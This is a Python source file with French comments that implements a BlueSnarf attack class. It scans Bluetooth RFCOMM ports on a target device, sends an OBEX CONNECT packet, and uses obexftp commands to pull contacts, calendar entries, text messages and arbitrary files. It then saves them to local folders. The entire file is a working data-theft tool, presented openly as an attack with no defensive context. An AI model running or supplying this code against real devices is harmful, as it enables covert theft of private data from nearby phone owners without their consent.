#!/usr/bin/env python3
"""
Attaque BlueSnarf - Extraction de données via OBEX
"""

import subprocess
import time
import struct
import socket
import threading
from typing import Dict, Any, Optional
import os

class BlueSnarfAttack:
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.running = False
        self.target_address = None
        self.callback = None
        
    def execute(self, target_address: str, callback=None, **kwargs) -> bool:
        """Exécuter l'attaque BlueSnarf"""
        self.target_address = target_address
        self.callback = callback
        self.running = True
        
        try:
            self._log(f"Démarrage de l'attaque BlueSnarf sur {target_address}")
            
            # Phase 1: Vérifier la vulnérabilité BlueSnarf
            if not self._check_bluesnarf_vulnerability(target_address):
                self._log("Cible non vulnérable à BlueSnarf", "warning")
                return False
                
            # Phase 2: Se connecter via OBEX
            if not self._connect_obex(target_address):
                self._log("Échec de la connexion OBEX", "error")
                return False
                
            # Phase 3: Extraire les données
            extracted_data = self._extract_data(target_address)
            if not extracted_data:
                self._log("Aucune donnée extraite", "warning")
                return False
                
            # Phase 4: Sauvegarder les données
            self._save_extracted_data(target_address, extracted_data)
            
            self._log("Attaque BlueSnarf réussie!", "success")
            return True
            
        except Exception as e:
            self._log(f"Erreur lors de l'attaque BlueSnarf: {e}", "error")
            return False
        finally:
            self.running = False
            
    def _check_bluesnarf_vulnerability(self, target_address: str) -> bool:
        """Vérifier si la cible est vulnérable à BlueSnarf"""
        try:
            self._log("Vérification de la vulnérabilité BlueSnarf...")
            
            # Vérifier si le port OBEX 9 est ouvert
            try:
                sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM)
                sock.settimeout(5)
                sock.connect((target_address, 9))  # Port OBEX
                sock.close()
                self._log("Port OBEX 9 ouvert - vulnérable à BlueSnarf", "info")
                return True
            except socket.error:
                pass
                
            # Vérifier d'autres ports OBEX
            obex_ports = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
            
            for port in obex_ports:
                if not self.running:
                    break
                    
                try:
                    sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM)
                    sock.settimeout(2)
                    sock.connect((target_address, port))
                    sock.close()
                    self._log(f"Port OBEX {port} ouvert - vulnérable à BlueSnarf", "info")
                    return True
                except socket.error:
                    continue
                    
            self._log("Aucun port OBEX vulnérable trouvé", "warning")
            return False
            
        except Exception as e:
            self._log(f"Erreur lors de la vérification BlueSnarf: {e}", "error")
            return False
            
    def _connect_obex(self, target_address: str) -> bool:
        """Se connecter via OBEX"""
        try:
            self._log("Tentative de connexion OBEX...")
            
            # Essayer de se connecter au port OBEX 9
            try:
                sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM)
                sock.settimeout(10)
                sock.connect((target_address, 9))
                
                # Envoyer une requête OBEX CONNECT
                connect_request = self._create_obex_connect_request()
                sock.send(connect_request)
                
                # Attendre la réponse
                response = sock.recv(1024)
                
                if response and len(response) > 0:
                    self._log("Connexion OBEX établie", "success")
                    sock.close()
                    return True
                    
                sock.close()
                
            except socket.error:
                pass
                
            # Essayer d'autres ports si le port 9 échoue
            for port in [1, 2, 3, 4, 5, 6, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]:
                if not self.running:
                    break
                    
                try:
                    sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM)
                    sock.settimeout(5)
                    sock.connect((target_address, port))
                    
                    connect_request = self._create_obex_connect_request()
                    sock.send(connect_request)
                    
                    response = sock.recv(1024)
                    
                    if response and len(response) > 0:
                        self._log(f"Connexion OBEX établie sur le port {port}", "success")
                        sock.close()
                        return True
                        
                    sock.close()
                    
                except socket.error:
                    continue
                    
            return False
            
        except Exception as e:
            self._log(f"Erreur lors de la connexion OBEX: {e}", "error")
            return False
            
    def _extract_data(self, target_address: str) -> Dict[str, Any]:
        """Extraire les données via OBEX"""
        extracted_data = {}
        
        try:
            self._log("Extraction des données...")
            
            # Extraire les contacts
            if self.config.get('extract_contacts', True):
                contacts = self._extract_contacts(target_address)
                if contacts:
                    extracted_data['contacts'] = contacts
                    
            # Extraire le calendrier
            if self.config.get('extract_calendar', True):
                calendar = self._extract_calendar(target_address)
                if calendar:
                    extracted_data['calendar'] = calendar
                    
            # Extraire les messages
            messages = self._extract_messages(target_address)
            if messages:
                extracted_data['messages'] = messages
                
            # Extraire les fichiers
            files = self._extract_files(target_address)
            if files:
                extracted_data['files'] = files
                
            return extracted_data
            
        except Exception as e:
            self._log(f"Erreur lors de l'extraction: {e}", "error")
            return {}
            
    def _extract_contacts(self, target_address: str) -> list:
        """Extraire les contacts"""
        try:
            self._log("Extraction des contacts...")
            
            # Utiliser obexftp pour extraire les contacts
            cmd = ['obexftp', '-b', target_address, '-B', '9', '-g', 'telecom/pb.vcf']
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            if result.returncode == 0:
                contacts = self._parse_vcf_data(result.stdout)
                self._log(f"{len(contacts)} contacts extraits", "success")
                return contacts
                
            return []
            
        except Exception as e:
            self._log(f"Erreur lors de l'extraction des contacts: {e}", "error")
            return []
            
    def _extract_calendar(self, target_address: str) -> list:
        """Extraire le calendrier"""
        try:
            self._log("Extraction du calendrier...")
            
            # Utiliser obexftp pour extraire le calendrier
            cmd = ['obexftp', '-b', target_address, '-B', '9', '-g', 'telecom/cal.vcs']
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            if result.returncode == 0:
                calendar = self._parse_vcs_data(result.stdout)
                self._log(f"{len(calendar)} événements extraits", "success")
                return calendar
                
            return []
            
        except Exception as e:
            self._log(f"Erreur lors de l'extraction du calendrier: {e}", "error")
            return []
            
    def _extract_messages(self, target_address: str) -> list:
        """Extraire les messages"""
        try:
            self._log("Extraction des messages...")
            
            # Essayer d'extraire les messages via OBEX
            messages = []
            
            # Utiliser obexftp pour lister les fichiers
            cmd = ['obexftp', '-b', target_address, '-B', '9', '-l']
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            if result.returncode == 0:
                # Parser la liste des fichiers
                lines = result.stdout.split('\n')
                for line in lines:
                    if '.txt' in line.lower() or '.sms' in line.lower():
                        filename = line.strip()
                        # Extraire le fichier
                        extract_cmd = ['obexftp', '-b', target_address, '-B', '9', '-g', filename]
                        extract_result = subprocess.run(extract_cmd, capture_output=True, text=True, timeout=30)
                        
                        if extract_result.returncode == 0:
                            messages.append({
                                'filename': filename,
                                'content': extract_result.stdout
                            })
                            
            return messages
            
        except Exception as e:
            self._log(f"Erreur lors de l'extraction des messages: {e}", "error")
            return []
            
    def _extract_files(self, target_address: str) -> list:
        """Extraire les fichiers"""
        try:
            self._log("Extraction des fichiers...")
            
            files = []
            
            # Utiliser obexftp pour lister et extraire les fichiers
            cmd = ['obexftp', '-b', target_address, '-B', '9', '-l']
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            if result.returncode == 0:
                lines = result.stdout.split('\n')
                for line in lines:
                    if line.strip() and not line.startswith('.'):
                        filename = line.strip()
                        
                        # Extraire le fichier
                        extract_cmd = ['obexftp', '-b', target_address, '-B', '9', '-g', filename]
                        extract_result = subprocess.run(extract_cmd, capture_output=True, text=True, timeout=30)
                        
                        if extract_result.returncode == 0:
                            files.append({
                                'filename': filename,
                                'size': len(extract_result.stdout),
                                'content': extract_result.stdout[:1000]  # Premiers 1000 caractères
                            })
                            
            return files
            
        except Exception as e:
            self._log(f"Erreur lors de l'extraction des fichiers: {e}", "error")
            return []
            
    def _save_extracted_data(self, target_address: str, data: Dict[str, Any]):
        """Sauvegarder les données extraites"""
        try:
            # Créer le répertoire de sauvegarde
            backup_dir = f"extracted_data/{target_address.replace(':', '_')}"
            os.makedirs(backup_dir, exist_ok=True)
            
            # Sauvegarder les contacts
            if 'contacts' in data:
                with open(f"{backup_dir}/contacts.vcf", 'w', encoding='utf-8') as f:
                    for contact in data['contacts']:
                        f.write(contact + '\n')
                        
            # Sauvegarder le calendrier
            if 'calendar' in data:
                with open(f"{backup_dir}/calendar.vcs", 'w', encoding='utf-8') as f:
                    for event in data['calendar']:
                        f.write(event + '\n')
                        
            # Sauvegarder les messages
            if 'messages' in data:
                with open(f"{backup_dir}/messages.txt", 'w', encoding='utf-8') as f:
                    for msg in data['messages']:
                        f.write(f"File: {msg['filename']}\n")
                        f.write(f"Content: {msg['content']}\n")
                        f.write("-" * 50 + "\n")
                        
            # Sauvegarder les fichiers
            if 'files' in data:
                with open(f"{backup_dir}/files.txt", 'w', encoding='utf-8') as f:
                    for file_info in data['files']:
                        f.write(f"File: {file_info['filename']}\n")
                        f.write(f"Size: {file_info['size']} bytes\n")
                        f.write(f"Content: {file_info['content']}\n")
                        f.write("-" * 50 + "\n")
                        
            self._log(f"Données sauvegardées dans {backup_dir}", "success")
            
        except Exception as e:
            self._log(f"Erreur lors de la sauvegarde: {e}", "error")
            
    def _create_obex_connect_request(self) -> bytes:
        """Créer une requête OBEX CONNECT"""
        # Header OBEX
        packet = struct.pack('B', 0x80)  # CONNECT
        packet += struct.pack('>H', 0x0000)  # Length (sera mis à jour)
        
        # Headers OBEX
        packet += struct.pack('B', 0x00)  # Target
        packet += struct.pack('B', 0x04)  # Length
        packet += b'OBEX'  # Target value
        
        # Mettre à jour la longueur
        length = len(packet) - 3
        packet = packet[:1] + struct.pack('>H', length) + packet[3:]
        
        return packet
        
    def _parse_vcf_data(self, vcf_content: str) -> list:
        """Parser les données VCF (contacts)"""
        contacts = []
        current_contact = ""
        
        for line in vcf_content.split('\n'):
            if line.startswith('BEGIN:VCARD'):
                current_contact = line + '\n'
            elif line.startswith('END:VCARD'):
                current_contact += line + '\n'
                contacts.append(current_contact)
                current_contact = ""
            elif current_contact:
                current_contact += line + '\n'
                
        return contacts
        
    def _parse_vcs_data(self, vcs_content: str) -> list:
        """Parser les données VCS (calendrier)"""
        events = []
        current_event = ""
        
        for line in vcs_content.split('\n'):
            if line.startswith('BEGIN:VEVENT'):
                current_event = line + '\n'
            elif line.startswith('END:VEVENT'):
                current_event += line + '\n'
                events.append(current_event)
                current_event = ""
            elif current_event:
                current_event += line + '\n'
                
        return events
        
    def _log(self, message: str, level: str = "info"):
        """Logger un message"""
        if self.callback:
            self.callback(message, level)
        else:
            print(f"[{level.upper()}] {message}")
            
    def stop(self):
        """Arrêter l'attaque"""
        self.running = False
